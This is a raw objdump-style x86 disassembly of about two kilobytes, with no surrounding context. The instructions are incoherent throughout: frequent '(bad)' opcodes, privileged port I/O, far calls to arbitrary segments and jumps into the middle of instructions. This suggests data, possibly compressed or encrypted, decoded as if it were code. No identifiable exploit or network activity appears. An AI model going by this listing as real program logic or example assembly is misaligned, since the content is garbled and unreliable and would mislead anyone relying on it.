  4144b1:	shr    DWORD PTR [edi-0x56],1
  4144b4:	sub    eax,0x9d9d05c5
  4144b9:	dec    ecx
  4144ba:	sbb    cl,bl
  4144bc:	sub    BYTE PTR [esi+0x32e8ce2],dh
  4144c2:	jp     0x41448f
  4144c4:	lock mov edx,0xc285d341
  4144ca:	lahf   
  4144cb:	outs   dx,BYTE PTR ds:[esi]
  4144cc:	loope  0x414540
  4144ce:	fdivr  QWORD PTR [esi]
  4144d0:	sbb    ebx,0xa
  4144d3:	popa   
  4144d4:	je     0x4144f5
  4144d6:	fdivr  st,st(4)
  4144d8:	cld    
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ds cdq 
  4144dc:	mov    cs,WORD PTR [ebx+edi*8]
  4144df:	mov    bh,ch
  4144e1:	cmp    DWORD PTR [esi],ebp
  4144e3:	mov    bh,0x2b
  4144e5:	and    BYTE PTR [ecx-0x1e63ad5e],cl
  4144eb:	lea    ecx,[edi]
  4144ed:	push   ds
  4144ee:	shr    BYTE PTR [edi+0x7e],0x33
  4144f2:	icebp  
  4144f3:	das    
  4144f4:	retf   
  4144f5:	sbb    eax,0x5ae6e3c4
  4144fa:	jg     0x41452d
  4144fc:	je     0x41455f
  4144fe:	aas    
  4144ff:	add    DWORD PTR [edx],esp
  414501:	jnp    0x4144ab
  414503:	test   al,0x30
  414505:	fnstsw WORD PTR [ebx]
  414507:	sbb    esi,DWORD PTR fs:[eax]
  41450a:	xchg   ebx,eax
  41450b:	js     0x414527
  41450d:	cwde   
  41450e:	cmp    BYTE PTR [ecx],0x5a
  414511:	dec    eax
  414512:	push   es
  414513:	push   esp
  414514:	fild   WORD PTR [eax-0x29]
  414517:	lahf   
  414518:	test   al,0xb3
  41451a:	sbb    BYTE PTR [ebx-0x41],ch
  41451d:	xlat   BYTE PTR ds:[ebx]
  41451e:	xchg   DWORD PTR [eax-0x3adbb87],ecx
  414524:	jge    0x414566
  414526:	mov    esp,esp
  414528:	cmp    eax,0x99186f04
  41452d:	pop    ebp
  41452e:	or     esi,0xffffffea
  414531:	repz fisttp WORD PTR [eax]
  414534:	lahf   
  414535:	cdq    
  414536:	imul   eax,esp,0xffffffda
  414539:	push   esi
  41453a:	adc    ebp,edx
  41453c:	mov    eax,0x646324f4
  414541:	adc    BYTE PTR [edx+0x1dc4723b],dh
  414547:	aaa    
  414548:	jp     0x4145b7
  41454a:	lahf   
  41454b:	(bad)  
  41454d:	aad    0xf2
  41454f:	xor    al,0xa6
  414551:	scas   eax,DWORD PTR es:[edi]
  414552:	xchg   edi,eax
  414553:	mov    ?,WORD PTR [edi+0x5e]
  414556:	out    dx,al
  414557:	add    BYTE PTR [esi+eiz*2+0x69212781],0xc9
  41455f:	push   0x89916152
  414564:	(bad)  
  414565:	js     0x414581
  414567:	mov    esp,0x2829f6ae
  41456c:	xchg   ebp,eax
  41456d:	or     esi,DWORD PTR [eax]
  41456f:	jg     0x414574
  414571:	ret    0x6891
  414574:	ret    
  414575:	dec    ebx
  414576:	adc    esp,DWORD PTR [edx+0x40]
  414579:	xor    esp,DWORD PTR [edx+0x77]
  41457c:	out    dx,eax
  41457d:	mov    cl,0x9
  41457f:	(bad)  
  414580:	aaa    
  414581:	xchg   edx,eax
  414582:	(bad)  
  414584:	inc    esp
  414585:	fsub   DWORD PTR ds:0x6167dd83
  41458b:	ss fs push ebp
  41458e:	outs   dx,BYTE PTR ds:[esi]
  41458f:	adc    edx,0x45818164
  414595:	das    
  414596:	push   ds
  414597:	popf   
  414598:	adc    BYTE PTR [eax+edi*2+0x1d],bh
  41459c:	fs add al,0x69
  41459f:	call   DWORD PTR [ecx-0xeb0425a]
  4145a5:	xchg   ebp,edx
  4145a7:	sti    
  4145a8:	mov    al,0x91
  4145aa:	push   esp
  4145ab:	add    eax,0xbf8bbc5f
  4145b0:	add    eax,0x15c8db7e
  4145b5:	aam    0xdf
  4145b7:	pop    ebx
  4145b8:	in     al,dx
  4145b9:	cld    
  4145ba:	inc    eax
  4145bb:	push   edx
  4145bc:	mov    al,0x97
  4145be:	sub    eax,0x2b01ef00
  4145c3:	sub    eax,ebx
  4145c5:	dec    ebx
  4145c6:	adc    eax,0x304c559f
  4145cb:	sub    cl,BYTE PTR [eax+0x37]
  4145ce:	cmp    eax,0x4f1e6963
  4145d3:	or     eax,0x3c6ec33d
  4145d8:	pop    eax
  4145d9:	push   es
  4145da:	pop    ecx
  4145db:	mov    dh,0x5
  4145dd:	adc    ebx,DWORD PTR [ebp-0x69f4ecec]
  4145e3:	mov    edx,0xf2450df5
  4145e8:	in     al,0xac
  4145ea:	add    DWORD PTR [ebp-0x4d76a9fd],0xff6a9ac1
  4145f4:	into   
  4145f5:	jecxz  0x4145b2
  4145f7:	es xchg ebx,ebx
  4145fa:	fbstp  TBYTE PTR [eax+eiz*8]
  4145fd:	rcr    bh,1
  4145ff:	je     0x41467f
  414601:	mov    ds:0xa7ce85f5,eax
  414606:	rcl    DWORD PTR [eax],0x12
  414609:	cmp    edx,DWORD PTR [edx]
  41460b:	rcl    BYTE PTR [ebx+0x79fb988b],cl
  414611:	inc    esp
  414612:	inc    edi
  414613:	add    eax,0x54a9474b
  414618:	mov    DWORD PTR [ebx-0x15894b11],edx
  41461e:	test   eax,0xb5f309c
  414623:	bound  edx,QWORD PTR [edx+0x1b]
  414626:	xchg   ecx,eax
  414627:	les    ebp,FWORD PTR [ebp+0x71]
  41462a:	sbb    BYTE PTR [ecx+0x1f],cl
  41462d:	or     ebx,ebp
  41462f:	addr16 sub al,0x1e
  414632:	xchg   bh,dh
  414634:	push   edi
  414635:	hlt    
  414636:	pushf  
  414637:	sub    eax,0x3daf49f9
  41463c:	outs   dx,DWORD PTR ds:[esi]
  41463d:	ret    0x987f
  414640:	push   cs
  414641:	jns    0x4145ff
  414643:	fnsave [ebx+0x1f01409d]
  414649:	xchg   ecx,eax
  41464a:	sbb    eax,0x16eff57a
  41464f:	sbb    esp,DWORD PTR [ebp+0x52]
  414652:	call   0xa3fa:0xf9d024f2
  414659:	ficomp DWORD PTR [ebx]
  41465b:	shl    DWORD PTR [eax-0x37addf6c],cl
  414661:	(bad)  
  414662:	stc    
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	xchg   esp,eax
  414665:	and    BYTE PTR ds:0x8f80563c,al
  41466b:	ret    0x8c0d
  41466e:	jle    0x414647
  414670:	cmp    al,dl
  414672:	push   0xdd7f19c8
  414677:	add    DWORD PTR [edx],ecx
  414679:	test   BYTE PTR [ecx+0x14],bl
  41467c:	iret   
  41467d:	or     esp,ebx
  41467f:	jns    0x414672
  414681:	push   cs
  414682:	jp     0x41461e
  414684:	cmc    
  414685:	push   0x5a
  414687:	in     al,dx
  414688:	sub    esi,DWORD PTR [edi-0x3e]
  41468b:	aas    
  41468c:	(bad)  
  41468d:	je     0x414637
  41468f:	pop    es
  414690:	mov    ebp,0xc41782ef
  414695:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414696:	fwait
  414697:	outs   dx,BYTE PTR ds:[esi]
  414698:	pop    ds
  414699:	shr    BYTE PTR [ebx-0x2e],1
  41469c:	pop    ds
  41469d:	push   ebp
  41469e:	in     al,0xeb
  4146a0:	jecxz  0x414687
  4146a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146a3:	mov    bl,0xd3
  4146a5:	pop    edx
  4146a6:	xchg   al,al
  4146a8:	enter  0x1d9c,0x71
  4146ac:	mov    eax,0xdb553f20
  4146b1:	adc    al,BYTE PTR [esp+ecx*1+0x7d]
  4146b5:	pop    edi
  4146b6:	push   esp
  4146b7:	jns    0x4da13cb8
  4146bd:	fadd   QWORD PTR [eax+0xf00864f]
  4146c3:	xchg   ebx,eax
  4146c4:	jae    0x4146ac
  4146c6:	jmp    0x253105eb
  4146cb:	and    BYTE PTR [ecx],0x88
  4146ce:	inc    edi
  4146cf:	pop    ebx
  4146d0:	sbb    dh,BYTE PTR ds:0x663a5f58
  4146d6:	and    al,0x5d
  4146d8:	inc    ebx
  4146d9:	add    bh,cl
  4146db:	mov    eax,ds:0xf49a7c9a
  4146e0:	jb     0x41469a
  4146e2:	lods   al,BYTE PTR ds:[esi]
  4146e3:	int3   
  4146e4:	sbb    DWORD PTR [ebx],0x35
  4146e7:	call   0x74b7:0xebf5ccb3
  4146ee:	test   al,0x85
  4146f0:	sti    
  4146f1:	xor    BYTE PTR es:[ebx+0x66],al
  4146f5:	fs cmp edx,esi
  4146f8:	scas   al,BYTE PTR es:[edi]
  4146f9:	jns    0x4146e7
  4146fb:	mov    ecx,0x13ae8bb5
  414700:	cld    
  414701:	sbb    eax,0x799480d8
  414706:	nop
  414707:	sbb    eax,ebx
  414709:	stos   BYTE PTR es:[edi],al
  41470a:	pusha  
  41470b:	adc    bh,BYTE PTR [edx-0x6b]
  41470e:	outs   dx,DWORD PTR ds:[esi]
  41470f:	push   cs
  414710:	ror    DWORD PTR [esi],0x1
  414713:	ret    0xdff3
  414716:	push   0xffffff9b
  414718:	sbb    al,0x92
  41471a:	mov    BYTE PTR [eax+0x4f15da20],bl
  414720:	or     eax,0xf0f1f2f
  414725:	or     ecx,DWORD PTR [eax+0x6334d8b5]
  41472b:	nop
  41472c:	jl     0x414701
  41472e:	loop   0x414734
  414730:	cld    
  414731:	mov    cl,0x98
  414733:	mov    WORD PTR [esp+eax*2+0xdb872ef],gs
  41473a:	hlt    
  41473b:	retf   0x87e1
  41473e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414740:	rcr    DWORD PTR [ebx+0x74],1
  414743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414744:	out    0x9c,eax
  414746:	call   0x94d8:0xcdcc7add
  41474d:	add    BYTE PTR [ebx+0x5],dl
  414750:	pop    esp
  414751:	sbb    al,0x82
  414753:	jge    0x41472b
  414755:	lds    ebp,FWORD PTR [eax-0x679fc08a]
  41475b:	sti    
  41475c:	adc    eax,0xc63e0c5b
  414761:	dec    edi
  414762:	sub    eax,0xbfb9bac4
  414767:	dec    edi
  414768:	or     bh,cl
  41476a:	std    
  41476b:	or     cl,ah
  41476d:	or     BYTE PTR ds:0x6b40fab5,bl
  414773:	lods   al,BYTE PTR ds:[esi]
  414774:	test   eax,0x4f6ca454
  414779:	arpl   WORD PTR [esi-0x29bc3025],bx
  41477f:	push   ecx
  414780:	popa   
  414781:	push   esi
  414782:	(bad)  
  414783:	cmc    
  414784:	dec    BYTE PTR [edx+eax*8]
  414787:	xchg   esi,eax
  414788:	xor    ebp,DWORD PTR ds:0xc89ecab0
  41478e:	pop    ecx
  41478f:	scas   eax,DWORD PTR es:[edi]
  414790:	sub    al,0xcf
  414792:	cmp    al,0x8
  414794:	inc    esp
  414795:	hlt    
  414796:	sbb    BYTE PTR [edx],ch
  414798:	sbb    eax,0x3cb05eea
  41479d:	pop    esi
  41479e:	ja     0x414758
  4147a0:	fisubr WORD PTR ds:0xaf54cb5c
  4147a6:	mov    eax,ds:0xe68bb1e7
  4147ab:	js     0x414731
  4147ad:	adc    al,0x8b
  4147af:	sub    al,0x62
  4147b1:	(bad)  
  4147b2:	mov    al,0x52
  4147b4:	and    eax,0x60959729
  4147b9:	leave  
  4147ba:	idiv   BYTE PTR [edx+eax*8]
  4147bd:	xor    edi,DWORD PTR [edi+0x269a9544]
  4147c3:	ss add eax,0xa31dc636
  4147c9:	sub    DWORD PTR [eax+esi*2-0x79ee607e],eax
  4147d0:	sub    eax,0x89aa960d
  4147d5:	in     eax,0xbc
  4147d7:	ret    
  4147d8:	inc    eax
  4147d9:	add    al,0x36
  4147db:	pop    esi
  4147dc:	js     0x4147e1
  4147de:	pop    eax
  4147df:	outs   dx,BYTE PTR ds:[esi]
  4147e0:	aam    0xd5
  4147e2:	jo     0x414771
  4147e4:	and    al,0x33
  4147e6:	sub    al,0xa7
  4147e8:	rol    BYTE PTR [eax-0x316d7c42],0x49
  4147ef:	push   edx
  4147f0:	ficomp DWORD PTR [ebp+0x4064f7f6]
  4147f6:	scas   eax,DWORD PTR es:[edi]
  4147f7:	vmovntps XMMWORD PTR [esi-0x3],xmm7
  4147fd:	div    DWORD PTR [ebx]
  4147ff:	je     0x4147e7
  414801:	sub    bl,BYTE PTR [esi+0x53]
  414804:	push   ss
  414805:	(bad)  
  414806:	(bad)  
  414807:	pop    es
  414808:	dec    esi
  414809:	jecxz  0x4147cb
  41480b:	fcomp  QWORD PTR [edi+0x3d]
  41480e:	jge    0x41483f
  414810:	dec    esp
  414811:	sbb    eax,0x35817417
  414816:	imul   DWORD PTR [ecx-0x34]
  414819:	scas   al,BYTE PTR es:[edi]
  41481a:	mov    edi,0x81fb0c95
  41481f:	sbb    eax,0x46977b23
  414824:	jecxz  0x41480b
  414826:	pop    ss
  414827:	pop    ds
  414828:	div    DWORD PTR [edi+0x44]
  41482b:	mov    edi,DWORD PTR [edi+ebx*8]
  41482e:	or     al,0xe2
  414830:	mov    dh,bl
  414832:	cmc    
  414833:	arpl   WORD PTR [eax-0x39],si
  414836:	inc    ebx
  414837:	xchg   ecx,eax
  414838:	sahf   
  414839:	sbb    eax,0x69f0cb33
  41483e:	leave  
  41483f:	pop    eax
  414840:	jp     0x414820
  414842:	test   al,0x46
  414844:	cmp    ebx,DWORD PTR [eax+0x76de9a20]
  41484a:	xor    ch,BYTE PTR [ecx]
  41484c:	add    al,0x28
  41484e:	sub    al,0x82
  414850:	lds    edx,FWORD PTR [ecx-0x49]
  414853:	push   cs
  414854:	adc    al,0xf9
  414856:	test   eax,0x3ab746ff
  41485b:	mov    dl,0x84
  41485d:	or     DWORD PTR gs:[edx+0x1e],esp
  414861:	cmp    DWORD PTR [ebp-0x47436a0c],ebx
  414867:	mov    bh,0xa7
  414869:	pop    esi
  41486a:	xchg   edi,eax
  41486b:	mov    ah,0xc7
  41486d:	adc    BYTE PTR [esi+0x57cccab6],0x52
  414874:	xor    al,0x1a
  414876:	int    0x52
  414878:	cdq    
  414879:	retf   
  41487a:	jecxz  0x4148b0
  41487c:	loopne 0x41486a
  41487e:	push   cs
  41487f:	cld    
  414880:	test   ch,0xa8
  414883:	mov    WORD PTR [esi],ds
  414885:	sbb    BYTE PTR [edx*4+0x6ffc6c5],ch
  41488c:	lahf   
  41488d:	add    edx,DWORD PTR [ecx+0x26]
  414890:	enter  0xa815,0x46
  414894:	sbb    ebp,edi
  414896:	inc    ebp
  414897:	push   cs
  414898:	mov    bl,0xad
  41489a:	out    0xce,eax
  41489c:	jnp    0x4148f8
  41489e:	icebp  
  41489f:	ret    0x971f
  4148a2:	add    esp,DWORD PTR [ebx]
  4148a4:	ret    
  4148a5:	(bad)  
  4148a6:	mov    esp,0x5ac7d197
  4148ab:	je     0x414835
  4148ad:	lds    ecx,FWORD PTR [ecx]
  4148af:	(bad)  
  4148b0:	(bad)  
  4148b2:	push   ecx
  4148b3:	pop    ss
  4148b4:	pusha  
  4148b5:	xlat   BYTE PTR ds:[ebx]
  4148b6:	out    0x82,eax
  4148b8:	xchg   ebp,eax
  4148b9:	lods   al,BYTE PTR ds:[esi]
  4148ba:	and    eax,edi
  4148bc:	iret   
  4148bd:	cmp    esi,ebx
  4148bf:	in     eax,dx
  4148c0:	sub    ecx,DWORD PTR [eax+0x5e]
  4148c3:	loopne 0x4148e9
  4148c5:	icebp  
  4148c6:	and    edx,DWORD PTR [esi+0x5e]
  4148c9:	imul   eax,DWORD PTR ds:0xdd9999df,0xffffffb3
  4148d0:	gs jmp 0x1c94:0x2a3c00e3
  4148d8:	or     bh,BYTE PTR [ebx+0x45]
  4148db:	and    cl,dh
  4148dd:	les    edx,FWORD PTR [esi-0x65]
  4148e0:	rcl    BYTE PTR [ecx],1
  4148e2:	in     eax,0xce
  4148e4:	mov    cs,WORD PTR [ecx]
  4148e6:	je     0x4148f4
  4148e8:	adc    eax,0x2adac838
  4148ed:	lods   al,BYTE PTR ds:[esi]
  4148ee:	xchg   ebp,eax
  4148ef:	int3   
  4148f0:	sbb    ebp,DWORD PTR [ecx]
  4148f2:	xlat   BYTE PTR ds:[ebx]
  4148f3:	add    BYTE PTR [eax+eiz*8],al
  4148f6:	and    eax,0xc2bce6f7
  4148fb:	xor    bl,BYTE PTR [edi-0x6e]
  4148fe:	lea    edx,[ecx+esi*2-0x44]
  414902:	jge    0x41497e
  414904:	and    al,0x6d
  414906:	fmul   DWORD PTR [ebp+0x69]
  414909:	mov    al,0xf0
  41490b:	rcr    DWORD PTR [eax-0x71],0x90
  41490f:	sar    dh,1
  414911:	mov    esp,DWORD PTR [edx-0x49a8cc97]
  414917:	mov    ds:0xb7c26685,eax
  41491c:	xchg   BYTE PTR [edx],ah
  41491e:	in     eax,dx
  41491f:	ja     0x4148ba
  414921:	scas   al,BYTE PTR es:[edi]
  414922:	mov    bh,0x91
  414924:	je     0x4148d3
  414926:	int3   
  414927:	lods   al,BYTE PTR ds:[esi]
  414928:	imul   esi,DWORD PTR [edi+ebp*1],0x8df45792
  41492f:	lahf   
  414930:	in     eax,0x33
  414932:	jns    0x4148e9
  414934:	jmp    0x414906
  414936:	inc    edx
  414937:	mov    dh,0x2d
  414939:	cwde   
  41493a:	or     edx,esi
  41493c:	ins    DWORD PTR es:[edi],dx
  41493d:	mov    eax,ds:0xf37d626b
  414942:	push   esi
  414943:	or     ebp,0xfc4b8410
  414949:	aas    
  41494a:	jo     0x41495c
  41494c:	(bad)  
  41494d:	jecxz  0x41490a
  41494f:	stos   DWORD PTR es:[edi],eax
  414950:	gs test al,0xfe
  414953:	or     ebx,DWORD PTR [ebx+0x79]
  414956:	call   0xcf39aec0
  41495b:	pop    ebp
  41495c:	jmp    0x81ab8125
  414961:	mov    dh,0xb
  414963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414964:	daa    
  414965:	cli    
  414966:	sub    dl,al
  414968:	ret    0xbd64
  41496b:	pop    ds
  41496c:	xchg   esi,eax
  41496d:	repz cwde 
  41496f:	in     al,0xad
  414971:	stos   BYTE PTR es:[edi],al
  414972:	sahf   
  414973:	jnp    0x4149db
  414975:	addr16 sbb bl,bl
  414978:	aas    
  414979:	jbe    0x41494e
  41497b:	jle    0x41491f
  41497d:	jl     0x4149ec
  41497f:	pop    ebx
  414980:	scas   eax,DWORD PTR es:[edi]
  414981:	jp     0x42067827
  414987:	xchg   ebp,eax
  414988:	ins    DWORD PTR es:[edi],dx
  414989:	mov    dl,0xd4
  41498c:	lods   eax,DWORD PTR ds:[esi]
  41498d:	xor    edx,DWORD PTR [ebx]
  41498f:	xor    DWORD PTR [eax-0x607e6db3],ecx
  414995:	scas   eax,DWORD PTR es:[edi]
  414996:	hlt    
  414997:	and    al,0xcc
  414999:	div    cl
  41499b:	fst    DWORD PTR [eax]
  41499d:	fidiv  DWORD PTR [eax-0x2eb3d9b8]
  4149a3:	ror    edi,1
  4149a5:	mov    al,ds:0xa7a403c
  4149aa:	outs   dx,DWORD PTR ds:[esi]
  4149ab:	inc    eax
  4149ac:	fisttp QWORD PTR [edx-0x47507e06]
  4149b2:	ror    DWORD PTR [esi],cl
  4149b4:	fld    QWORD PTR gs:[bx+si+0x6d]
  4149b9:	scas   al,BYTE PTR es:[edi]
  4149ba:	call   0x3205:0x73af52cb
  4149c1:	icebp  
  4149c2:	push   esp
  4149c3:	inc    edx
  4149c4:	das    
  4149c5:	inc    edi
  4149c6:	adc    BYTE PTR ds:0xde5ebfe6,bh
  4149cc:	loopne 0x4149c9
  4149ce:	inc    ebx
  4149cf:	xor    esp,DWORD PTR fs:[esi-0x4fbc56e1]
  4149d6:	iret   
  4149d7:	lods   eax,DWORD PTR ds:[esi]
  4149d8:	xor    eax,0x5d8a548c
  4149dd:	inc    esi
  4149de:	mov    edi,fs
  4149e0:	daa    
  4149e1:	fwait
  4149e2:	inc    BYTE PTR [edx]
  4149e4:	push   edi
  4149e5:	jbe    0x4149ce
  4149e7:	push   ecx
  4149e8:	je     0x414a4e
  4149ea:	push   es
  4149eb:	fcom   DWORD PTR [esi-0x2883286a]
  4149f1:	xchg   ecx,eax
  4149f2:	dec    eax
  4149f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149f4:	arpl   WORD PTR [edx+0xb4a37b2],bx
  4149fa:	pmovmskb edi,mm3
  4149fd:	cmp    ah,0xe9
  414a00:	pop    es
  414a01:	rcr    esi,0x78
  414a04:	adc    esp,DWORD PTR [eax+eiz*1]
  414a07:	xchg   edx,eax
  414a08:	das    
  414a09:	pushf  
  414a0a:	pop    ds
  414a0b:	clc    
  414a0c:	lock pop edi
  414a0e:	sbb    al,BYTE PTR [edx-0x4b]
  414a11:	xchg   cl,ch
  414a13:	popa   
  414a14:	stos   DWORD PTR es:[edi],eax
  414a15:	cmp    BYTE PTR [esi],ch
  414a17:	(bad)  
  414a18:	jno    0x4149d7
  414a1a:	sub    ebp,DWORD PTR [edi+0x258afabd]
  414a20:	cmc    
  414a21:	cmp    ecx,DWORD PTR [esi+0x66]
  414a24:	xchg   ecx,eax
  414a25:	inc    ebx
  414a26:	stc    
  414a27:	aad    0xdc
  414a29:	lods   eax,DWORD PTR ds:[esi]
  414a2a:	jnp    0x4149b6
  414a2c:	inc    esi
  414a2d:	and    BYTE PTR [edi],ah
  414a2f:	and    al,0x31
  414a31:	jmp    0x933d1681
  414a36:	scas   eax,DWORD PTR es:[edi]
  414a37:	mov    ah,0xce
  414a39:	or     eax,0x1750c283
  414a3e:	mov    edi,0x2601a395
  414a43:	ret    0x3a7a
  414a46:	fnstenv [edx]
  414a48:	out    dx,eax
  414a49:	and    DWORD PTR [esi+0x4beaae05],edi
  414a4f:	(bad)  
  414a50:	cdq    
  414a51:	int3   
  414a52:	shr    bh,0x67
  414a55:	mov    edx,0x5401bab7
  414a5a:	js     0x414ab1
  414a5c:	xchg   BYTE PTR [ebx-0x41],cl
  414a5f:	adc    al,0xaa
  414a61:	ins    DWORD PTR es:[edi],dx
  414a62:	fidivr WORD PTR [eax+0x1d]
  414a65:	cmp    al,0xc8
  414a67:	add    BYTE PTR [ebx],0x42
  414a6a:	ins    BYTE PTR es:[edi],dx
  414a6b:	iret   
  414a6c:	adc    edi,ebx
  414a6e:	or     ah,BYTE PTR [esi+ebp*4+0x65db90c8]
  414a75:	adc    DWORD PTR [eax-0x49],eax
  414a78:	call   0xe066e84e
  414a7d:	jb     0x414a89
  414a7f:	or     DWORD PTR [edi],ebx
  414a81:	bound  edx,QWORD PTR [eax+0x74]
  414a84:	dec    ebx
  414a85:	cmp    DWORD PTR [eax+0x2b68e50f],esp
  414a8b:	xchg   ebx,eax
  414a8c:	cdq    
  414a8d:	sub    BYTE PTR [ecx+ecx*1],al
  414a90:	ror    BYTE PTR [esi],cl
  414a92:	mov    ds:0x96ee5720,al
  414a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a98:	retf   0xe39d
  414a9b:	bound  ecx,QWORD PTR [edi+0x1d]
  414a9e:	xor    bh,BYTE PTR [esi]
  414aa0:	daa    
  414aa1:	push   cs
  414aa2:	into   
  414aa3:	ss scas al,BYTE PTR es:[edi]
  414aa5:	addr16 mov ds:0xeb6d,al
  414aa9:	fstp   QWORD PTR [edx+0x36590f01]
  414aaf:	fwait
  414ab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ab1:	inc    edi
  414ab2:	dec    esp
  414ab3:	test   eax,0x807c42c2
  414ab8:	es ret 
  414aba:	js     0x414a8d
  414abc:	retf   0x9c05
  414abf:	dec    eax
  414ac0:	aam    0x9f
  414ac2:	or     DWORD PTR [edx],ebp
  414ac4:	(bad)  
  414ac5:	sub    eax,DWORD PTR [eax+0x19]
  414ac8:	rcr    BYTE PTR [eax+0x45],cl
  414acb:	push   edx
  414acc:	bound  esp,QWORD PTR [ebp+0x5a]
  414acf:	scas   al,BYTE PTR es:[edi]
  414ad0:	sbb    cl,al
  414ad2:	mov    ah,0xd4
  414ad4:	xor    ch,al
  414ad6:	sti    
  414ad7:	pop    ebx
  414ad8:	mov    DWORD PTR [ebp+0x2113821c],ebx
  414ade:	(bad)  
  414adf:	fiadd  DWORD PTR [esp+ebp*1-0x74]
  414ae3:	mov    al,0xd8
  414ae5:	jmp    0x3539:0xa9e6952d
  414aec:	pop    ebp
  414aed:	ja     0x414af3
  414aef:	stos   BYTE PTR es:[edi],al
  414af0:	scas   eax,DWORD PTR es:[edi]
  414af1:	mov    ah,0x47
  414af3:	adc    DWORD PTR [ebx],0x9568524a
  414af9:	inc    ecx
  414afa:	xchg   BYTE PTR [edi+ebx*1-0x38260798],dh
  414b01:	pushf  
  414b02:	inc    ecx
  414b03:	jo     0x414a97
  414b05:	inc    BYTE PTR fs:[eax+edi*4+0x8]
  414b0a:	or     eax,DWORD PTR [esi]
  414b0c:	jbe    0x414b81
  414b0e:	outs   dx,DWORD PTR ds:[esi]
  414b0f:	adc    al,0xdd
  414b11:	pop    edx
  414b12:	sub    BYTE PTR [edi-0x35e2fadf],al
  414b18:	fwait
  414b19:	ss addr16 xchg esi,esi
  414b1d:	mov    esi,0xc63440a
  414b22:	(bad)  
  414b24:	adc    al,0x7c
  414b26:	inc    edi
  414b27:	jmp    0x6385:0xe06035d7
  414b2e:	push   ss
  414b2f:	jg     0x414b9c
  414b31:	mov    esi,0xe8513ae
  414b36:	pop    es
  414b37:	adc    eax,0x1d1e459c
  414b3c:	retf   0xd4f9
  414b3f:	adc    al,0xa9
  414b41:	push   ss
  414b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b43:	stc    
  414b44:	cmc    
  414b45:	or     al,0xf4
  414b47:	or     BYTE PTR [ecx-0x6bd19606],dl
  414b4d:	not    DWORD PTR [eax]
  414b4f:	rcr    BYTE PTR [edi],1
  414b51:	push   eax
  414b52:	sub    eax,0xead052c6
  414b57:	in     al,dx
  414b58:	xchg   ecx,eax
  414b59:	in     eax,0x8e
  414b5b:	or     BYTE PTR [eax],bh
  414b5d:	inc    edi
  414b5e:	dec    edx
  414b5f:	std    
  414b60:	out    dx,al
  414b61:	je     0x414b5f
  414b63:	sub    DWORD PTR [esi+eiz*4+0x526974bf],ecx
  414b6a:	lods   eax,DWORD PTR ds:[esi]
  414b6b:	xchg   ecx,eax
  414b6c:	fadd   DWORD PTR [ebx]
  414b6e:	in     eax,0xd1
  414b70:	inc    esp
  414b71:	fsubr  st(3),st
  414b73:	call   0xa7e7e9f6
  414b78:	push   0x7d
  414b7a:	push   0xd1f28a03
  414b7f:	mov    WORD PTR [ebx+0x7f],gs
  414b82:	data16 jp 0x414bdc
  414b85:	sbb    esi,DWORD PTR [esi]
  414b87:	stos   BYTE PTR es:[edi],al
  414b88:	ror    cl,0xa1
  414b8b:	jbe    0x414b32
  414b8d:	test   DWORD PTR [ecx-0x5a],ebx
  414b90:	pushf  
  414b91:	in     eax,dx
  414b92:	mov    eax,ds:0x2a4c2d94
  414b97:	xor    DWORD PTR [ebx-0x7e],0x49f70844
  414b9e:	lds    ebx,FWORD PTR [esp+eiz*8]
  414ba1:	cmp    esi,esi
  414ba3:	adc    eax,0x33801fc7
  414ba8:	push   cs
  414ba9:	sub    DWORD PTR [edi+0x4d],ecx
  414bac:	xor    DWORD PTR [esi-0x796c1dbf],eax
  414bb2:	ds call 0x82c4:0x4a878469
  414bba:	stos   DWORD PTR es:[edi],eax
  414bbb:	cld    
  414bbc:	mov    esi,0xd452042b
  414bc1:	cmc    
  414bc2:	xchg   ebx,eax
  414bc3:	scas   al,BYTE PTR es:[edi]
  414bc4:	int    0x9a
  414bc6:	fldl2e 
  414bc8:	setns  BYTE PTR [esi-0x6b8b0d78]
  414bcf:	mov    cl,0xee
  414bd1:	das    
  414bd2:	addr16 nop
  414bd4:	jecxz  0x414c2c
  414bd6:	(bad)  
  414bd7:	(bad)  [ebx+0x3c]
  414bda:	push   ds
  414bdb:	inc    esi
  414bdc:	mov    al,BYTE PTR ds:0x54d730b3
  414be2:	xor    al,0xa0
  414be4:	xchg   esp,eax
  414be5:	aaa    
  414be6:	jno    0x414b8b
  414be8:	test   DWORD PTR [edi-0x52],0x20c14f74
  414bef:	mov    dh,cl
  414bf1:	pusha  
  414bf2:	pop    esi
  414bf3:	int3   
  414bf4:	add    BYTE PTR ds:0x75d04564,ah
  414bfa:	je     0x414c14
  414bfc:	mov    dl,0xdb
  414bfe:	stos   DWORD PTR es:[edi],eax
  414bff:	or     DWORD PTR [edi+0x4d522037],edi
  414c05:	into   
  414c06:	and    al,0x2f
  414c08:	aaa    
  414c09:	mov    ecx,0x5a4b6617
  414c0e:	mov    ebx,DWORD PTR [edx+0x77]
  414c11:	stos   DWORD PTR es:[edi],eax
  414c12:	push   ds
  414c13:	adc    al,0x2f
  414c15:	or     eax,DWORD PTR [ecx-0x21f499b5]
  414c1b:	cwde   
  414c1c:	fmul   QWORD PTR [edi+0x21]
  414c1f:	test   al,0x3b
  414c21:	nop
  414c22:	xor    al,0x59
  414c24:	out    dx,eax
  414c25:	(bad)  
  414c26:	or     ebx,DWORD PTR [ebx-0x2506adc3]
  414c2c:	mov    bh,0xce
  414c2e:	pop    eax
  414c2f:	dec    eax
  414c30:	int    0x79
  414c32:	dec    esp
  414c33:	fdiv   QWORD PTR [edx]
  414c35:	pop    esp
  414c36:	xchg   ecx,eax
  414c37:	pop    esi
  414c38:	add    esi,DWORD PTR [edx-0x2]
  414c3b:	xlat   BYTE PTR ds:[ebx]
  414c3c:	nop
  414c3d:	cmp    eax,0x3964e8cc
  414c42:	or     al,0x2b
  414c44:	(bad)  
  414c45:	in     eax,0x84
  414c47:	mov    eax,0xc1b78dc4
  414c4c:	push   edx
  414c4d:	in     al,0xef
  414c4f:	or     esp,esp
  414c51:	out    0x1c,eax
